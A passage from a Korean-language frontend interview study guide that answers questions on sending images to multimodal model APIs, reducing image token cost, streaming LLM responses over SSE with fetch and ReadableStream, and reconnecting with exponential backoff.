- Q. RAG가 환각을 줄이는 이유? → A. 실제 문서를 근거로 답하게 해 모델의 추측을 억제. 프론트는 그 출처를 보여 검증을 돕는다.
- Q. 임베딩·벡터 검색은 누가? → A. 보통 백엔드. 프론트는 입력·표시·UX·피드백에 집중.

<details><summary>📝 한 줄 요약</summary>RAG=검색+생성. 프론트는 질의 UX·출처(citation) 표시·인용 하이라이트·스트리밍 렌더·진행 상태·피드백 담당 → 답변 신뢰성 전달이 핵심.</details>

## Q105. 이미지를 멀티모달 모델에 보낼 때 Base64와 멀티파트 중 어떤 방식을 선호할까요? 🟡

**💬 30초 답변**
> 작은 이미지나 JSON 기반 API에는 **Base64**가 간단해서 유리하지만, 고화질·대용량 이미지는 크기가 33% 늘고 메모리 부담이 커 **멀티파트(multipart/form-data)** 가 효율적입니다. 일반적으로 대용량·파일 업로드는 멀티파트를 선호합니다.

**📖 핵심 개념**

📌 **비교**

| 항목 | Base64 (JSON 인라인) | 멀티파트 (multipart/form-data) |
|------|----------------------|-------------------------------|
| 크기 | **약 33% 증가**(Q82) | 원본 그대로(바이너리) |
| 구현 | JSON에 문자열로 간단 | FormData, 약간 복잡 |
| 메모리 | 인코딩으로 부담↑ | 스트리밍 업로드 가능 |
| 적합 | 작은 이미지·아이콘, 단일 요청 | 대용량·다중 파일 업로드 |

```js
// Base64 (작은 이미지)
fetch("/api", { method:"POST", headers:{"Content-Type":"application/json"},
  body: JSON.stringify({ image: "data:image/png;base64,iVBOR..." }) });

// 멀티파트 (대용량 권장)
const fd = new FormData();
fd.append("image", fileBlob);
fetch("/api", { method:"POST", body: fd });  // Content-Type 자동
```

🎯 **선택 기준**: **작고 JSON에 함께 보낼 단순 경우 → Base64**, **고화질·대용량·여러 파일 → 멀티파트**. API 명세(모델 제공사 SDK)가 요구하는 형식도 따름.

> 💡 모델 API(OpenAI/Anthropic 등)는 보통 Base64 또는 이미지 URL을 받음. URL 방식이면 이미지를 스토리지(S3)에 올리고 URL만 전달 → 페이로드 최소화 + 캐싱 이점.

**🔥 예상 꼬리질문**
- Q. URL 방식의 장점? → A. 페이로드가 작고 CDN 캐싱 가능. 단 공개 접근/서명 URL 관리 필요.
- Q. Base64가 33% 커지는데 왜 쓰나? → A. JSON 한 요청에 담아 단순하게 처리할 수 있어 작은 이미지엔 편리.

<details><summary>📝 한 줄 요약</summary>작은 이미지·JSON 인라인=Base64(간단, 33%↑) / 고화질·대용량·다중=멀티파트(원본 크기·스트리밍). URL 방식이면 페이로드 최소+캐싱.</details>

## Q106. 고화질 사진 업로드 시 토큰 비용을 아끼고 속도를 높이는 방법은? 🟡

**💬 30초 답변**
> 멀티모달 모델은 이미지 **해상도에 비례해 토큰을 소비**하므로, 업로드 전 클라이언트에서 **리사이즈·압축**해 모델이 요구하는 최대 유효 해상도로 줄입니다. 포맷 변환(WebP), 불필요한 메타데이터 제거, 적절한 detail 레벨 설정으로 비용과 속도를 함께 개선합니다.

**📖 핵심 개념**

📌 **클라이언트 사전 처리**
- **리사이즈**: 모델 권장 해상도로 다운스케일(예: 장변 ~1024~1568px). 그 이상은 토큰만 늘고 정확도 이득 적음
- **압축**: JPEG/WebP 품질 조절로 용량↓ (`canvas`/`createImageBitmap` 활용)
- **포맷**: WebP/AVIF로 변환해 전송량↓
- **detail 파라미터**: 모델이 제공하면 `low`/`high` 선택 — 텍스트 인식 필요 없으면 low로 토큰 절약

```js
// canvas로 리사이즈 후 전송 (개념)
const bitmap = await createImageBitmap(file);
const scale = Math.min(1024 / bitmap.width, 1);
const canvas = new OffscreenCanvas(bitmap.width*scale, bitmap.height*scale);
canvas.getContext("2d").drawImage(bitmap, 0, 0, canvas.width, canvas.height);
const blob = await canvas.convertToBlob({ type: "image/webp", quality: 0.8 });
```

📌 **효과**
- 토큰 비용↓ (해상도 비례 과금)
- 업로드·처리 속도↑ (전송량↓)
- 서버/모델 부하↓

> 💡 이미지 토큰은 보통 해상도(타일 수)로 계산됨. "더 크게 = 더 정확"이 아니라 **유효 해상도 이상은 낭비** — 모델 문서의 권장 크기에 맞추는 게 핵심. 텍스트/세밀함이 중요하면 high, 일반 인식이면 축소.

**🔥 예상 꼬리질문**
- Q. 무작정 고화질로 보내면? → A. 토큰·비용·지연만 늘고 정확도 이득은 미미하거나 없음 → 권장 해상도로 리사이즈.
- Q. 클라에서 리사이즈하는 이유? → A. 전송량부터 줄여 업로드 속도·서버 부하·토큰을 한 번에 절감.

<details><summary>📝 한 줄 요약</summary>이미지 토큰=해상도 비례. 업로드 전 클라에서 리사이즈·압축·WebP 변환·detail 조절. 유효 해상도 이상은 낭비 → 권장 크기로 축소.</details>

## Q107. LLM 텍스트 응답 구현 시 SSE와 웹소켓 중 무엇을 선호하나요? 🔴

**💬 30초 답변**
> LLM 텍스트 스트리밍처럼 **서버→클라이언트 단방향** 전송에는 **SSE(Server-Sent Events)** 를 선호합니다. HTTP 기반이라 구현이 간단하고 자동 재연결을 지원하며, 양방향이 필요 없는 토큰 스트리밍에 적합하기 때문입니다. 양방향 실시간(음성 대화 등)이 필요하면 웹소켓을 고려합니다.

**📖 핵심 개념**

📌 **비교 (LLM 맥락)**

| 항목 | SSE | 웹소켓 |
|------|-----|--------|
| 방향 | 서버→클라 단방향 | 양방향 |
| 프로토콜 | HTTP | 별도(ws/wss) |
| 구현 | 간단 | 상대적 복잡 |
| 자동 재연결 | ✅ (EventSource 기본) | 직접 구현 |
| 인프라 호환 | HTTP라 프록시·방화벽 친화 | 일부 제약 |
| LLM 적합성 | **토큰 스트리밍에 최적** | 양방향(음성·협업) |

🎯 **LLM 텍스트 응답은 본질이 "서버가 토큰을 밀어주는 단방향"** → SSE가 딱 맞음. 사용자 입력은 일반 POST로 시작하고, 응답만 스트리밍.

```
클라 ──POST(질문)──▶ 서버
클라 ◀══SSE 토큰 스트림══ 서버  (data: {...}\n\n 반복)
```

> 💡 단, 브라우저 `EventSource`는 **GET·헤더 커스텀 제약**이 있어, 인증 헤더·POST가 필요한 LLM API는 **fetch + ReadableStream**으로 SSE 형식을 직접 파싱하는 방식을 많이 씀(Q108). "프로토콜은 SSE 스타일, 구현은 fetch 스트림".

**🔥 예상 꼬리질문**
- Q. 왜 웹소켓이 아닌가요? → A. LLM 응답은 단방향이라 양방향 오버헤드가 불필요. SSE가 단순·HTTP 친화·자동 재연결.
- Q. EventSource를 안 쓰고 fetch를 쓰는 이유? → A. EventSource는 GET·헤더 제약 → 인증/POST가 필요한 LLM 요청엔 fetch+ReadableStream이 유연.

<details><summary>📝 한 줄 요약</summary>LLM 토큰 스트리밍=단방향 → SSE 선호(HTTP·간단·자동 재연결). 양방향(음성)만 웹소켓. 실제 구현은 인증/POST 때문에 fetch+ReadableStream로 SSE 파싱.</details>

## Q108. Fetch API로 스트리밍 응답을 처리할 때 ReadableStream을 어떻게 다루나요? 🔴

**💬 30초 답변**
> `fetch` 응답의 `response.body`는 **ReadableStream**입니다. `getReader()`로 reader를 얻어 `read()`를 반복 호출하며 청크(Uint8Array)를 받고, `TextDecoder`로 문자열로 디코딩한 뒤 SSE 형식을 파싱해 토큰을 누적·렌더합니다. `done`이 true가 되면 종료합니다.

**📖 핵심 개념**

```js
const res = await fetch("/api/chat", { method: "POST", body, signal });
const reader = res.body.getReader();          // ReadableStream 리더
const decoder = new TextDecoder();
let buffer = "";

while (true) {
  const { value, done } = await reader.read(); // 청크 단위로 읽기
  if (done) break;                             // 스트림 종료

  buffer += decoder.decode(value, { stream: true }); // 바이트 → 문자열
  const lines = buffer.split("\n\n");          // SSE 이벤트 경계
  buffer = lines.pop();                        // 마지막 미완성 조각 보관

  for (const line of lines) {
    if (line.startsWith("data: ")) {
      const data = line.slice(6);
      if (data === "[DONE]") return;
      const token = JSON.parse(data).choices?.[0]?.delta?.content ?? "";
      setText(prev => prev + token);           // 토큰 누적 렌더
    }
  }
}
```

📌 **핵심 포인트**
- `response.body.getReader()` → `read()` 루프 (`{ value, done }`)
- `value`는 **Uint8Array** → `TextDecoder`로 디코딩(`stream: true`로 멀티바이트 안전)
- 청크가 **이벤트 경계와 안 맞을 수 있음** → **버퍼링** 후 `\n\n`로 분리(미완성 조각 보관)
- `AbortController`로 중단 연결(Q102)
- 최신 브라우저는 `for await (const chunk of res.body)` 비동기 이터레이션도 가능

> ⚠️ 흔한 버그: 청크 경계를 가정하고 바로 파싱 → 토큰이 잘림. 반드시 **버퍼에 모았다가 완성된 라인만** 처리. 한글 등 멀티바이트는 `decode(value, {stream:true})`로 끊김 방지.

**🔥 예상 꼬리질문**
- Q. 왜 버퍼링이 필요한가요? → A. 네트워크 청크가 SSE 이벤트(`\n\n`) 단위로 안 떨어져, 라인이 중간에 잘릴 수 있어서.
- Q. TextDecoder의 stream:true는? → A. 멀티바이트 문자가 청크 경계에서 잘려도 다음 청크와 이어 안전하게 디코딩.

<details><summary>📝 한 줄 요약</summary>response.body=ReadableStream → getReader().read() 루프로 청크(Uint8Array) 수신 → TextDecoder 디코딩 → 버퍼링 후 \n\n로 SSE 파싱 → 토큰 누적. done에 종료, Abort로 중단.</details>

## Q109. 스트리밍 도중 네트워크 연결이 끊겼을 때 재연결 전략은? 🟡

**💬 30초 답변**
> 연결 끊김을 감지하면 **지수 백오프(exponential backoff)** 로 재시도하고, 중복·유실을 막기 위해 **마지막 수신 지점(Last-Event-ID/오프셋)부터 이어받기**를 시도합니다. SSE의 `EventSource`는 자동 재연결을 제공하고, fetch 스트림은 직접 재연결 로직을 구현합니다.

**📖 핵심 개념**

📌 **재연결 전략**
- **감지**: `read()` 에러/스트림 조기 종료, `online`/`offline` 이벤트, 타임아웃
- **지수 백오프 + 지터**: 1s → 2s → 4s ... (+무작위) 로 재시도, 최대 횟수 제한
```js
let delay = 1000;
async function connectWithRetry(attempt = 0) {
  try { await streamChat(); }
  catch (e) {
    if (attempt >= MAX) return showError();
    await wait(delay + Math.random() * 300);  // 지터
    delay *= 2;                                // 지수 증가
    connectWithRetry(attempt + 1);
  }
}
```
- **이어받기(resume)**: SSE의 `Last-Event-ID` 헤더 또는 토큰 오프셋/메시지 ID를 서버에 보내 **끊긴 지점부터** 재개 → 중복·누락 방지
- **상태 보존**: 이미 받은 부분 텍스트 유지, 재연결 중 인디케이터 표시
- **온라인 복귀 감지**: `window.addEventListener("online", ...)`로 즉시 재시도

```
끊김 감지 → (이미 받은 텍스트 유지) → 백오프 대기 → Last-Event-ID로 재연결 → 이어서 스트리밍
```

> 💡 `EventSource`는 끊기면 자동으로 재연결하고 `Last-Event-ID`를 보내줌 → 서버가 그 ID 이후부터 보내면 매끄러운 이어받기. fetch 방식은 이 동작을 직접 구현해야 함. 백오프 없이 즉시 재시도하면 서버에 폭주(thundering herd) 유발.

**🔥 예상 꼬리질문**
- Q. 지수 백오프에 지터를 넣는 이유? → A. 여러 클라이언트가 동시에 재시도해 서버가 몰리는 것(thundering herd)을 분산.
- Q. 중복 토큰을 막으려면? → A. 메시지/이벤트 ID(Last-Event-ID)나 오프셋으로 받은 지점 이후만 요청.

<details><summary>📝 한 줄 요약</summary>끊김 감지→지수 백오프+지터로 재시도→Last-Event-ID/오프셋으로 끊긴 지점부터 이어받기. 받은 텍스트 유지, online 이벤트로 즉시 복귀. EventSource는 자동.</details>
